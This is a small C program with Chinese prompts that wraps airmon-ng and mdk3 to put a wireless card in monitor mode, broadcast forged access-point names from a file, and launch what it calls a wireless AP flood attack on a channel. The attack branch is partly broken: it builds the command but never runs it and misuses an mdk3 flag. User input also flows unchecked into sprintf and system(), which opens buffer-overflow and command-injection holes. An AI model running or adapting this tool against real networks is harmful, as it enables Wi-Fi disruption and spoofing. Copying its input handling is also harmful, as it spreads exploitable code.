#include<stdio.h>
#include<stdlib.h>
int main(void){
    char networkcardname[50];
    char filenameone[60];
    char tmp[100];
    int choice;
    int ch;

    printf("请输入网卡名称：");
    scanf("%s",networkcardname);
//    printf("%s",networkcardname); 调试
    printf("请输入：\n0.停止网卡监听模式\n1.无限AP伪造\n2.无线AP泛洪攻击\n");
    scanf("%d",&choice);
//    printf("%d",choice);          
    switch(choice){
        case 1 :
            printf("请输入伪造AP名称的文件所在处(绝对路径)(最好不要带空格，有空格的自己转义)：");
            scanf("%s",filenameone);
            sprintf(tmp,"sudo airmon-ng start %s >> /dev/null",networkcardname);
            system(tmp);
            printf("\n网卡监听模式已开启\n");
            printf("Ctrl+C停止");
            sprintf(tmp,"sudo mdk3 wlan0mon b -n -f %s >> /dev/null",filenameone);
            system(tmp);

            break ;
        case 2 :
            printf("请输入ap的ch:");
            scanf("%d",&ch);
            printf("无线频道干扰中，Ctrl+C停止");
            sprintf(tmp,"sudo mdk3 %s a -a %d",networkcardname,ch);
            break;
        case 0 :
            system("sudo airmon-ng stop wlan0mon >> /dev/null ");
            break;
    }
}